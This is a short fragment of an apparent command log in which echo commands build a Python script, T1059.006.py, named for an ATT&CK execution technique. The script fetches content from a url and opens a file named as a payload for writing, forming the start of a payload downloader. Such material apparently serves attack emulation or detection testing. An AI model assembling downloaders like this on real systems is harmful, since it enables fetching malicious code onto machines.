+response:echo 'session = requests.session()' >> T1059.006.py
+
+
+action:
+command:echo 'source = session.get(url).content' >> T1059.006.py
+response:echo 'source = session.get(url).content' >> T1059.006.py
+
+
+action:
+command:echo 'fd = open("T1059.006-payload", "wb+")' >> T1059.006.py
+response:echo 'fd = open("T1059.006-payload", "wb+")' >> T1059.006.py
+
+
